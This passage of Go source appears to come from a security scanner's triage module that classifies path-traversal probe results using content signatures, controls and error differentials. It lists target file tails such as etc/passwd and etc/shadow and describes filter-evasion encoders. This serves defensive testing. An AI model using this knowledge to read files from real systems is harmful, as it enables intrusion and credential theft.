	{Name: "php.include", Re: regexp.MustCompile(`(?m)^Warning: (include|require|file_get_contents|readfile|fopen)\(`)},
	{Name: "java.file", Re: regexp.MustCompile(`java\.io\.FileNotFoundException: |java\.nio\.file\.NoSuchFileException: `)},
	{Name: "dotnet.file", Re: regexp.MustCompile(`System\.IO\.(FileNotFoundException|DirectoryNotFoundException): Could not find (file|a part of the path) '`)},
	{Name: "node.enoent", Re: regexp.MustCompile(`ENOENT: no such file or directory, (open|stat|lstat) '`)},
	{Name: "python.enoent", Re: regexp.MustCompile(`FileNotFoundError: \[Errno 2\] No such file or directory: '`)},
	{Name: "ruby.enoent", Re: regexp.MustCompile(`Errno::ENOENT`)},
	{Name: "go.open", Re: regexp.MustCompile(`open [^\s:]+: (no such file or directory|The system cannot find the)`)},
}

// trvPayloadTails are the distinctive tails a disclosed path must contain for the disclosure rule
// to count. Without this, a stack trace that merely mentions a file is a finding.
var trvPayloadTails = []string{"etc/passwd", "win.ini", "proc/version", "etc/shadow", "etc/hosts"}

// trvListingNames is the Java directory-listing rule: three or more of these, no <form, under
// 64 KiB. Fewer than three matches a documentation page.
var trvListingNames = []string{"passwd", "hosts", "hostname", "shadow", "group", "resolv.conf"}

const trvListingMaxBody = 64 * 1024

// trvStoreError is the object-store family, which a passwd ladder cannot see at all.
var trvStoreError = regexp.MustCompile(`<Error><Code>(NoSuchKey|AccessDenied|SignatureDoesNotBatch|SignatureDoesNotMatch)`)

// ---------------------------------------------------------------------------------------------
// CLASSIFY
// ---------------------------------------------------------------------------------------------

// Classify returns exactly one verdict for the slot, and it can reach clean by exactly one route.
//
// THE SHAPE OF THIS FUNCTION IS THE POINT. Every early return is an unknown with a reason, and
// the clean at the bottom is guarded by every precondition above it. Written the other way round,
// with clean as the default and the unknowns as exceptions, one missing branch is a green tick
// for a class that never ran, and that is the bug this codebase has shipped repeatedly.
func (c traversalClassifier) Classify(ctx triage.ClassifyCtx) []triage.ClassVerdict {
	key := ctx.Slot.Key
	ann := map[string]any{}
	one := func(state triage.TriageState, reason, oracle string, grade triage.TriageGrade, ords []uint64) []triage.ClassVerdict {
		return []triage.ClassVerdict{{
			Class: triage.ClassTraversal, SlotKey: key, State: state, Reason: reason,
			Grade: grade, Oracle: oracle, Ordinals: ords, Annotations: ann,
			Label: trvLabel(ann),
		}}
	}

	if reason, ok := faEligibleSlot(ctx.Slot); !ok {
		return one(triage.StateNotApplicable, reason, "", triage.GradeUnrated, nil)
	}
	if r := c.Reaches(ctx.Slot.Kind, ctx.Vector.MediaType); r.Reach == triage.ReachNever {
		return one(triage.StateNotReachable, r.Reason, "", triage.GradeUnrated, nil)
	}

	own := faOwn(ctx.Own)
	if len(own) == 0 {
		switch {
		case !ctx.Route.Resolved():
			return one(triage.StateCannotDetermine,
				"route_unresolved: the composed URL at its observed value did not resolve, so a 404 "+
					"from a dot-segment probe would be unattributable and nothing was sent",
				"", triage.GradeUnrated, nil)
		case ctx.Prelude.Failed():
			return one(triage.StateCannotDetermine,
				"prelude_failed: the vector needs a token this run could not obtain, so every probe "+
					"would have measured the login page",
				"", triage.GradeUnrated, nil)
		case ctx.Budget.Exhausted():
			return one(triage.StateNotRun,
				"probe_budget_exhausted: the slot or run cap was reached before this class sent anything",
				"", triage.GradeUnrated, nil)
		default:
			return one(triage.StateNotPlanned,
				"no traversal probe was derived for this slot and no reason above applies, which is "+
					"itself the finding: report it rather than reading it as a clean",
				"", triage.GradeUnrated, nil)
		}
	}

	// Fail closed on a vault refusal. If the set and the vault disagree about who owns a response
	// this class stops asserting anything at all.
	for _, o := range own {
		if o.Err != nil {
			return one(triage.StateCannotDetermine,
				"foreign_observation: the vault refused one of this class's own reads ("+o.Err.Error()+
					"), so the provenance of at least one response is unknown and nothing may be scored",
				"", triage.GradeUnrated, faOrdinals(own))
		}
	}

	// Wire honesty. A probe whose bytes did not reach the wire tested nothing.
	var honest []faOwnObs
	var skips []triage.ProbeSkip
	for _, o := range own {
		if why, ok := faWireIsHonest(o.Obs); !ok {
			skips = append(skips, triage.ProbeSkip{ProbeID: o.ProbeID, Reason: why})
			continue
		}
		honest = append(honest, o)
	}
	// The probes that never came back at all. They are appended to skips BEFORE any verdict is
	// built, so every return path below carries them in Untested rather than only the clean one.
	gaps := trvSweepGaps(own, ctx.Slot.Kind)
	skips = append(skips, gaps...)
	// probes_sent used to be len(own), which counts responses and not sends: a probe the encoder
	// refused produces no response, so it was invisible to the count that was supposed to reveal
	// it. The three numbers are now named for what each one actually measures.
	ann["probes_with_a_response"] = len(own)
	ann["probes_on_the_wire"] = len(honest)
	ann["probes_requested_with_no_response"] = len(gaps)
	if len(honest) == 0 {
		v := one(triage.StateCannotDetermine,
			"no_probe_reached_the_wire: every payload this class sent was refused, altered or left "+
				"unsubstituted, so nothing about this slot was measured",
			"", triage.GradeUnrated, faOrdinals(own))
		v[0].Untested = skips
		return v
	}

	ords := faOrdinals(honest)
	baselines := faBaselineBodies(ctx)
	ann["baseline_samples_available"] = len(baselines)
	if len(baselines) == 0 {
		v := one(triage.StateCannotDetermine,
			"no_baseline_body: the baseline-absence rule is what separates a real file read from a "+
				"documentation page that always shows root:x:0:0, and with no unperturbed body in hand "+
				"this class cannot apply it. Every content signature is therefore unusable here",
			"", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}

	// Uniform block, reached from THIS CLASS'S OWN distinct payloads.
	if faUniformBlock(faObsOf(honest), baselines[0]) {
		v := one(triage.StateCannotDetermine,
			"blocked: three or more of this class's own distinct payloads produced byte-identical "+
				"non-baseline responses, which is a filter answering rather than the application, so "+
				"nothing was learned about the path sink",
			"", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}

	live, disabled := faDisabledByBaseline(trvSignatures, baselines)
	if len(disabled) > 0 {
		ann["signatures_disabled_by_baseline"] = disabled
	}
	if len(live) == 0 {
		v := one(triage.StateCannotDetermine,
			"signature_in_baseline: every content signature this class has already matches an "+
				"unperturbed response from this endpoint, so none of them can distinguish a read from "+
				"the page it always serves",
			"", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}

	// The controls. Each one names the detector it validates, and a control that fires makes the
	// detector unverified rather than making the slot clean.
	if nc2, ok := faFind(honest, trvNC2); ok && ctx.Route.Resolved() {
		if faCompare(nc2.Obs, ctx.Route.Obs()) == faCmpSame {
			v := one(triage.StateCannotDetermine,
				"value_ignored: NC2 put a nonexistent subdirectory in front of the observed value and "+
					"the response was identical to the baseline, so this slot discards its value and no "+
					"traversal verdict about it would mean anything",
				"", triage.GradeUnrated, ords)
			v[0].Untested = skips
			return v
		}
	}
	if c1, ok := faFind(honest, trvC1); ok {
		if p, _ := faMatchSignatures(live, c1.Obs.Body); len(p) > 0 {
			ann["control_that_fired"] = "TR-C1 (" + p[0].Name + ")"
			v := one(triage.StateCannotDetermine,
				"detector_unverified (signature_unsound): a content signature fired on a filename that "+
					"cannot exist, so it is matching the echo or a canned page rather than a file read. "+
					"This class's content detectors are disabled for this slot and the run is flagged",
				"", triage.GradeUnrated, ords)
			v[0].Untested = skips
			return v
		}
	}
	if nc4, ok := faFind(honest, trvNC4); ok {
		if p, _ := faMatchSignatures(live, nc4.Obs.Body); len(p) > 0 && strings.HasPrefix(p[0].Name, "win.") {
			ann["control_that_fired"] = "TR-NC4 (" + p[0].Name + ")"
			v := one(triage.StateCannotDetermine,
				"detector_unverified: the Windows content signatures fired on a directory that cannot "+
					"exist, so they are not measuring a file read on this endpoint",
				"", triage.GradeUnrated, ords)
			v[0].Untested = skips
			return v
		}
	}
	if nc1, ok := faFind(honest, trvNC1); ok {
		if p, _ := faMatchSignatures(live, nc1.Obs.Body); len(p) > 0 {
			ann["control_that_fired"] = "TR-NC1 (" + p[0].Name + ")"
			v := one(triage.StateCannotDetermine,
				"detector_unverified: './'+value is not an escape and it produced a file signature, so "+
					"the signature is not evidence of traversal on this endpoint",
				"", triage.GradeUnrated, ords)
			v[0].Untested = skips
			return v
		}
	}

	// T0's escape mechanics: annotations only. It never suppresses a probe.
	dotsegResolved := false
	if t0, ok := faFind(honest, trvT0); ok && ctx.Route.Resolved() {
		switch faCompare(t0.Obs, ctx.Route.Obs()) {
		case faCmpSame:
			if _, echoed := faMarkerForm(t0.Obs.Body, t0.Marker); !echoed {
				dotsegResolved = true
				ann["dotseg_resolved"] = true
				ann["os_family"] = "win32_or_resolved_lexically"
			} else {
				ann["dotseg_echoed"] = true
			}
		case faCmpDifferent:
			if t0.Obs.Status >= 400 && t0.Obs.Status < 500 {
				ann["os_family"] = "posix"
				dotsegResolved = true
				ann["dotseg_resolved"] = true
			}
		}
	}

	// ORACLE 1, rank 1: content, confirmed by the filename-tracking pair.
	var hits []faSigHit
	var hitProbes []triage.ProbeID
	for _, o := range honest {
		if o.ProbeID == trvC1 || o.ProbeID == trvNC1 || o.ProbeID == trvNC2 || o.ProbeID == trvNC4 {
			continue
		}
		body := o.Obs.Body
		if o.ProbeID == trvT3 && len(body) == 0 {
			// A /proc pseudo-file reports size 0, so a server that sets Content-Length from stat()
			// sends 0 and a conforming client reads an empty body. That is a limit of the
			// transport and it is NOT this detector staying silent.
			ann["proc_zero_length"] = true
			continue
		}
		p, corr := faMatchSignatures(live, body)
		// The base64 half of the rule: a read that came back base64 encoded, decoded and matched
		// on the PLAINTEXT signatures rather than on a guessed base64 constant.
		for _, d := range faDecodedRuns(body, baselines) {
			dp, dc := faMatchSignatures(live, d)
			p = append(p, dp...)
			corr = append(corr, dc...)
		}
		if len(p) == 0 {
			continue
		}
		hits = append(hits, p...)
		hitProbes = append(hitProbes, o.ProbeID)
		ann["winning_probe"] = string(o.ProbeID)
		ann["winning_encoder"] = o.Obs.Payload.EncoderChain
		if len(corr) > 0 {
			ann["corroborating"] = corr[0].Name
		}
	}
	if len(hits) > 0 {
		names := map[string]bool{}
		for _, h := range hits {
			names[h.Name] = true
		}
		c1Silent := false
		if c1, ok := faFind(honest, trvC1); ok {
			if p, _ := faMatchSignatures(live, c1.Obs.Body); len(p) == 0 {
				c1Silent = true
			}
		}
		ann["signatures_hit"] = len(names)
		ann["probes_hit"] = hitProbes
		grade := triage.GradeMedium
		reason := "one anchored content signature fired on an escape payload and the filename-tracking control stayed silent"
		if len(names) >= 2 && c1Silent {
			grade = triage.GradeHigh
			reason = "two unrelated anchored content signatures fired, and the same depth and encoder " +
				"with a filename that cannot exist stayed silent. One WAF page, one documentation page " +
				"and one echo can each produce at most one of those"
		}
		if !c1Silent {
			grade = triage.GradeLow
		}
		v := one(triage.StateFinding, reason, "content_signature", grade, ords)
		v[0].Untested = skips
		v[0].Evidence = triage.TriageEvidence{
			Ordinal: ords[0], Matched: hits[0].Matched, Offset: hits[0].Offset,
			Length: hits[0].Length, Phrase: hits[0].Name,
		}
		return v
	}

	// ORACLE 2, rank 2: path disclosure. It fires when the application refused to open the file
	// and still told us where it looked.
	for _, o := range honest {
		hit, base, ok := trvDisclosed(o.Obs.Body, baselines)
		if !ok {
			continue
		}
		ann["disclosed_base_dir"] = base
		ann["stack_identified_by"] = hit.Name
		v := one(triage.StateFinding,
			"path_disclosure: the application refused to open the file and named the path it tried, "+
				"and that path contains a distinctive tail of this probe's own payload, which is "+
				"evidence of concatenation rather than of reflection",
			"path_disclosure", triage.GradeMedium, ords)
		v[0].Untested = skips
		v[0].Evidence = triage.TriageEvidence{
			Ordinal: o.Ordinal, Matched: hit.Matched, Offset: hit.Offset, Length: hit.Length, Phrase: hit.Name,
		}
		return v
	}

	// ORACLE 3, rank 3: the directory listing.
	if t10, ok := faFind(honest, trvT10); ok {
		if n, ok2 := trvListing(t10.Obs.Body); ok2 {
			ann["listing_names_seen"] = n
			v := one(triage.StateFinding,
				"directory_listing: the response carries three or more known /etc filenames, no HTML "+
					"form and under 64 KiB, which is a servlet container serving a directory rather than a "+
					"page that happens to mention those names",
				"directory_listing", triage.GradeMedium, ords)
			v[0].Untested = skips
			return v
		}
	}

	// ORACLE 4, rank 4: the escape that involves no operating-system file. This is the family a
	// passwd ladder is structurally blind to, and it is scored on shape, never on a signature.
	if t9, ok := faFind(honest, trvT9); ok && ctx.Route.Resolved() {
		base := ctx.Route.Obs()
		if trvStoreError.Match(t9.Obs.Body) && !trvStoreError.Match(base.Body) {
			v := one(triage.StateSuspicious,
				"store_escape: a sibling-name escape produced an object-store error the baseline does "+
					"not carry, so the value is being concatenated into a key and the escape left the "+
					"prefix. No OS file is involved and no passwd ladder could have seen this",
				"store_error", triage.GradeMedium, ords)
			v[0].Untested = skips
			return v
		}
		if trvKeySetGained(t9.Obs, base) {
			v := one(triage.StateSuspicious,
				"route_escape: the sibling-name escape returned a document whose JSON key set is "+
					"disjoint from the baseline's, which is the shape of an internal route reached through "+
					"the parameter rather than of an error",
				"shape_differential", triage.GradeLow, ords)
			v[0].Untested = skips
			return v
		}
	}

	// ORACLE 5, rank 5: the blind three-way. Nothing is read; only the class of error is observed.
	if v := c.blind(ctx, honest, ann, ords, skips); v != nil {
		return v
	}

	// From here down nothing fired. What remains is deciding which KIND of nothing it was.
	if ctx.Baseline.Degraded {
		v := one(triage.StateCannotDetermine,
			"degraded: the comparison was degraded (an oversized, truncated or untokenisable body), "+
				"and a degraded comparison can never produce a clean",
			"", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}
	if dotsegResolved {
		// FN3. The application resolved the dot segments and every content probe was silent. The
		// most common reason is an appended extension with errors suppressed, and this class
		// cannot separate that from a real negative.
		v := one(triage.StateCannotDetermine,
			"append_suspected: T0 showed the dot segments being resolved, so the value reaches a path, "+
				"and every content probe was silent. On a stack that appends an extension and suppresses "+
				"errors that is exactly what a live traversal looks like, and this class cannot separate "+
				"it from a real negative. lfimap with its truncation wordlist can",
			"", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}
	if !faSentAll(honest, trvT1L, trvT1W, trvC1, trvNC1) {
		v := one(triage.StateNotRun,
			"incomplete_minimum: this class's five-probe minimum (T0, NC1, T1L, T1W, C1) did not all "+
				"reach the wire, and a clean over a partial minimum is a clean about payloads that were "+
				"never sent",
			"", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}

	if why := trvUnfinishedReason(skips); why != "" {
		v := one(triage.StateNotRun, why, "", triage.GradeUnrated, ords)
		v[0].Untested = skips
		return v
	}

	ann["clean_preconditions"] = []string{
		"every probe this class asked for produced an honest response",
		"the five-probe minimum reached the wire",
		"at least one unperturbed body was available for the baseline-absence rule",
		"at least one content signature was live rather than disabled by the baseline",
		"the value-ignored control differed from the baseline",
		"no negative control fired",
		"three distinct payloads did not collide on one response",
		"the comparison was not degraded",
	}
	ann["residue_not_covered"] = []string{
		"a WAF that strips '../' recursively AND tolerates neither the overlong nor the double-encoded form",
		"a signed or JWT-wrapped slot, which is signed_wrapper and not this",
		"filter evasion beyond three encoders, which is the confirmation tool's job by design",
	}
	v := one(triage.StateClean,
		"this class's own probes ran, reached the wire, and its own oracles stayed silent with the "+
			"preconditions in the annotations all holding",
		"", triage.GradeUnrated, ords)
	v[0].Untested = skips
	return v
}

// blind is the three-way error differential, and it is this class's only answer when the file is
// read and never returned.
//
// It needs the stability gate, because it is a rank 5 differential and a noisy endpoint produces
// three different responses to any three payloads. It needs the echo strip, because the three
// payloads have different lengths and an echoing endpoint would otherwise fire it on every slot.
// And it needs NC1 to match the baseline, because that is what says the slot is not simply
// erroring on everything.
func (traversalClassifier) blind(ctx triage.ClassifyCtx, honest []faOwnObs, ann map[string]any, ords []uint64, skips []triage.ProbeSkip) []triage.ClassVerdict {
	eacces, okA := faFind(honest, trvC3a)
	enoent, okB := faFind(honest, trvC1)
	readable, okC := faFind(honest, trvT1L)
	if !okA || !okB || !okC {
		return nil
	}
	if !ctx.Baseline.Stable {
		ann["blind_oracle"] = "not_run: the stability gate was " + ctx.Baseline.GateReason +
			", and a rank 5 differential on an endpoint that differs from itself proves nothing"
		return nil
	}
	if nc1, ok := faFind(honest, trvNC1); ok && ctx.Route.Resolved() {
		if faCompare(nc1.Obs, ctx.Route.Obs()) != faCmpSame {
			ann["blind_oracle"] = "not_run: NC1 did not reproduce the baseline, so the endpoint " +
				"reacts to any unfamiliar value and the three-way difference would not be about the filesystem"
			return nil
		}
	}
	pairs := [][2]triage.Observation{
		{eacces.Obs, enoent.Obs},
		{eacces.Obs, readable.Obs},
		{enoent.Obs, readable.Obs},
	}
	differing := 0
	maskedOnly := 0
	for _, p := range pairs {
		switch faCompareStripped(p[0], p[1]) {
		case faCmpDifferent:
			differing++
		case faCmpSame:
			if faCompare(p[0], p[1]) == faCmpDifferent {
				maskedOnly++
			}
		}
	}
	ann["blind_pairs_differing_after_echo_strip"] = differing
	ann["blind_pairs_explained_by_the_echo"] = maskedOnly
	if differing == 0 {
		return nil
	}
	if differing >= 1 && maskedOnly > 0 {
		v := []triage.ClassVerdict{{
			Class: triage.ClassTraversal, SlotKey: ctx.Slot.Key, State: triage.StateMaskedOnly,
			Reason: "the three error conditions differ, but at least one pair's difference disappears " +
				"once the echoed payload is removed, so the endpoint may be reflecting rather than opening",
			Oracle: "blind_three_way", Grade: triage.GradeLow, Ordinals: ords,
			Annotations: ann, Untested: skips, Label: trvLabel(ann),
		}}
		return v
	}
	return []triage.ClassVerdict{{
		Class: triage.ClassTraversal, SlotKey: ctx.Slot.Key, State: triage.StateFinding,
		Reason: "blind_traversal: a path that exists and cannot be read, a path that does not exist, " +
			"and a path that can be read produced responses that differ from each other after the echo " +
			"was stripped, while './'+value reproduced the baseline. The application is performing a " +
			"filesystem operation on attacker-named paths outside its directory. Nothing was read",
		Oracle: "blind_three_way", Grade: triage.GradeMedium, Ordinals: ords,
		Annotations: ann, Untested: skips, Label: trvLabel(ann),
	}}
}

// trvDisclosed applies the two-condition path-disclosure rule.
func trvDisclosed(body []byte, baselines [][]byte) (faSigHit, string, bool) {
	live, _ := faDisabledByBaseline(trvDisclosure, baselines)
	p, _ := faMatchSignatures(live, body)
	if len(p) == 0 {
		return faSigHit{}, "", false
	}
	// The disclosed path must contain a distinctive tail of our own payload, and the window is
	// taken on BOTH SIDES of the matched phrase because every real stack puts the path before the
	// phrase about as often as after it: PHP writes include(/path/...): failed to open stream,
	// while Node writes ENOENT: no such file or directory, open '/path/...'. Without this second
	// condition the rule fires on every shared-hosting error page in the world, and with a
	// one-sided window it silently misses the most common stack of the two.
	lo := max(0, p[0].Offset-trvDisclosureWindow)
	hi := min(len(body), p[0].Offset+p[0].Length+trvDisclosureWindow)
	window := body[lo:hi]
	for _, tail := range trvPayloadTails {
		i := bytes.Index(window, []byte(tail))
		if i < 0 {
			continue
		}
		return p[0], string(window[trvPathStart(window[:i]) : i+len(tail)]), true
	}
	return faSigHit{}, "", false
}

// trvDisclosureWindow is how far either side of the matched phrase the disclosed path may sit.
const trvDisclosureWindow = 512

// trvPathStart walks back from the payload tail to the start of the quoted or bracketed path, so
// what is handed to the operator as disclosed_base_dir is the document root and not a fragment of
// the error sentence.
func trvPathStart(before []byte) int {
	i := bytes.LastIndexAny(before, "'\"( \t\n")
	if i < 0 {
		return 0
	}
	return i + 1
}

// trvListing applies the three-name directory-listing rule with its two guards.
func trvListing(body []byte) (int, bool) {
	if len(body) == 0 || len(body) > trvListingMaxBody {
		return 0, false
	}
	if bytes.Contains(bytes.ToLower(body), []byte("<form")) {
		return 0, false
	}
	n := 0
	for _, name := range trvListingNames {
		if bytes.Contains(body, []byte(name)) {
			n++
		}
	}
	return n, n >= 3
}

// trvKeySetGained reports whether the probe's JSON key set is disjoint from the baseline's, which
// is the shape of a different internal route answering rather than of an error page.
func trvKeySetGained(probe, base triage.Observation) bool {
	if !probe.Proj.JSONParsed || !base.Proj.JSONParsed {
		return false
	}
	if len(probe.Proj.JSONKeySet) == 0 || len(base.Proj.JSONKeySet) == 0 {
		return false
	}
	seen := map[string]bool{}
	for _, k := range base.Proj.JSONKeySet {
		seen[k] = true
	}
	for _, k := range probe.Proj.JSONKeySet {
		if seen[k] {
			return false
		}
	}
	return true
}

// faSentAll reports whether every named probe reached the wire. It is the guard on the clean.
func faSentAll(honest []faOwnObs, ids ...triage.ProbeID) bool {
	for _, id := range ids {
		if _, ok := faFind(honest, id); !ok {
			return false
		}
	}
	return true
}

// trvLabel is what the operator and the confirmation tool are handed.
//
// The caution about lfimap belongs on the label and not in a wiki: lfimap's heuristics module
// sends an XSS polyglot, a CRLF polyglot, a SQL-error probe and an open-redirect probe from
// inside the file-inclusion tool, and its keyword list mixes file signatures with XSS strings.
// That is the merged design the isolation law forbids. Use it to confirm traversal and ignore its
// XSS, CRLF, SQLi and open-redirect claims entirely.
func trvLabel(ann map[string]any) triage.TriageLabel {
	hints := map[string]string{
		"tool_caution": "lfimap's heuristics module emits XSS, CRLF, SQLi and open-redirect claims " +
			"from inside a file tool. Read its file-inclusion output only; those other classes have " +
			"their own triage and their own confirmation tools",
		"hand_over": "the winning encoder, the depth (8), the OS family, the disclosed base directory, " +
			"and whether the hit came from a path slot or a non-path slot, because that last one says " +
			"whether a proxy is normalising the path before the origin sees it",
	}
	if v, ok := ann["disclosed_base_dir"]; ok {
		hints["document_root"] = fmt.Sprint(v)
	}
	if v, ok := ann["os_family"]; ok {
		hints["os_family"] = fmt.Sprint(v)
	}
	return triage.TriageLabel{
		Tools: []string{"lfimap", "lfihunt", "dotdotpwn"},
		Hints: hints,
	}
}

// ---------------------------------------------------------------------------------------------
// CONFIRMERS, EVIDENCERS, ORACLE CASES
// ---------------------------------------------------------------------------------------------

// Confirmers are the second measurements. Every one of them is this class's own probe pair.
func (traversalClassifier) Confirmers() []faConfirmer {
	return []faConfirmer{
		{
			Name: "C1_filename_tracking_pair", Probes: []triage.ProbeID{trvT1L, trvC1},
			Rule: "the signature fires on the real filename and is SILENT on a filename that cannot " +
				"exist, at the same depth and the same encoder, inside one drift window. This proves the " +
				"response tracks the FILENAME rather than the traversal sequence, which kills the WAF-page " +
				"and payload-echo families in one request pair",
		},
		{
			Name: "C2_two_unrelated_signatures", Probes: []triage.ProbeID{trvT1L, trvT3},
			Rule: "two files whose anchored signatures share no substring. One WAF page, one " +
				"documentation page or one echo cannot produce two unrelated anchored signatures, so two " +
				"independent hits is high confidence and one plus a silent C1 is medium",
		},
		{
			Name: "C3_blind_three_way", Probes: []triage.ProbeID{trvT1L, trvC3a, trvC1},
			Rule: "readable, unreadable and nonexistent produce responses that differ from each other " +
				"AFTER the echo strip, while './'+value reproduces the baseline. Nothing is read and it is " +
				"not time based",
		},
	}
}

// Evidencers name what this class hands over.
func (traversalClassifier) Evidencers() []faEvidencer {
	return []faEvidencer{
		{Name: "matched_signature", Kind: "content", What: "the anchored line that matched, with its offset, so an operator can find it"},
		{Name: "disclosed_base_dir", Kind: "error_path", What: "the path quoted inside the application's own open error. The single most useful thing this class produces short of file contents, because it tells lfimap how deep to go and it identifies the document root"},
		{Name: "winning_encoder", Kind: "annotation", What: "none implies no filter, '....//' implies a non-recursive stripper, pct_twice implies a filter running before a second decode, iis_unicode implies an IIS-era decoder, '..;/' implies nginx in front of a servlet container"},
		{Name: "os_family", Kind: "annotation", What: "from which signature fired and, independently and for free, from T0: a tolerated nonexistent intermediate means Win32 lexical canonicalisation"},
		{Name: "proxy_normalisation", Kind: "differential", What: "a path slot silent while a query slot on the same vector hits"},
		{Name: "blind_three_way", Kind: "differential", What: "which pairs differed after the echo strip, so the operator can see the oracle's own working"},
	}
}

// OracleCases is what the oracle container owes this class before its detectors are verified.
//
// THE SILENT ROUTES ARE THE ONES THAT MATTER and two of them do not exist yet. /clean/passwddoc
// exercises the baseline-absence rule and /trav/ignored exercises the negative control most
// scanners omit; without them, a detector that fires on any page mentioning root:x:0:0 and a
// class that reports clean on a parameter the application discards both score a pass.
func (traversalClassifier) OracleCases() []faOracleCase {
	return []faOracleCase{
		{
			Name: "traversal_reads_passwd", Route: "/lfi", Expect: faExpectPositive, Exists: true,
			Probes: []triage.ProbeID{trvT1L, trvC1}, WantState: triage.StateFinding,
			Why: "already serves a canned passwd with ARS0N_CANARY_OK in the gecos field",
		},
		{
			Name: "traversal_appends_extension", Route: "/trav/append", Expect: faExpectPositive, Exists: false,
			Probes: []triage.ProbeID{trvT1L}, WantState: triage.StateFinding,
			Why: "appends '.json' to whatever it is given, so every content probe 404s and ONLY the " +
				"path-disclosure oracle can fire. It is the route that proves the highest-yield oracle on " +
				"a hardened application actually works",
		},
		{
			Name: "baseline_already_shows_passwd", Route: "/clean/passwddoc", Expect: faExpectNegative, Exists: false,
			Probes: []triage.ProbeID{trvT1L}, WantState: triage.StateCannotDetermine,
			Why: "the baseline body contains root:x:0:0 inside a <code> block, as a real API " +
				"documentation page does. The class must reach cannot_determine (signature_in_baseline) " +
				"and must NOT report a finding and must NOT report a clean",
		},
		{
			Name: "parameter_is_discarded", Route: "/trav/ignored", Expect: faExpectNegative, Exists: false,
			Probes: []triage.ProbeID{trvNC2}, WantState: triage.StateCannotDetermine,
			Why: "the parameter is thrown away entirely, so NC2 comes back same as baseline and the " +
				"verdict must be value_ignored. This is the control most scanners omit and it is what " +
				"separates a real clean from a slot nobody reads",
		},
		{
			Name: "uniform_block_page", Route: "/clean/waf", Expect: faExpectNegative, Exists: true,
			Probes: []triage.ProbeID{trvT1L, trvT1W, trvT4}, WantState: triage.StateCannotDetermine,
			Why: "an identical 403 for every payload. The assertion that matters is that this class " +
				"reaches blocked from ITS OWN three distinct payloads, not from a cross-class annotation",
		},
		{
			Name: "reflection_is_not_injection", Route: "/clean/echo", Expect: faExpectNegative, Exists: true,
			Probes: []triage.ProbeID{trvT1L, trvC1, trvNC1}, WantState: triage.StateClean,
			Why: "an endpoint that reflects the payload and opens no file. Because no signature in " +
				"this class shares a substring with any payload in this class, the echo cannot produce a " +
				"hit, and a legitimate clean here is what proves the class is not a did-the-page-change " +
				"detector",
		},
		{
			Name: "blind_read_no_content", Route: "/trav/blind", Expect: faExpectPositive, Exists: false,
			Probes: []triage.ProbeID{trvT1L, trvC3a, trvC1}, WantState: triage.StateFinding,
			Why: "opens the named path, returns no content, and answers with three distinguishable " +
				"error shapes for readable, unreadable and absent. Without it the blind oracle has never " +
				"been observed firing at all",
		},
		{
			Name: "500_on_everything", Route: "/clean/always500", Expect: faExpectNegative, Exists: true,
			Probes: []triage.ProbeID{trvT1L, trvC3a, trvC1}, WantState: triage.StateCannotDetermine,
			Why: "a 500 for every input including a benign one. '5xx means injection' is not a rule " +
				"here, and the blind three-way must not fire when all three errors are the same error. " +
				"The expected state is the uniform-block cannot_determine and NOT a clean, because an " +
				"endpoint that answers identically to everything told us nothing about its path sink",
		},
	}
}
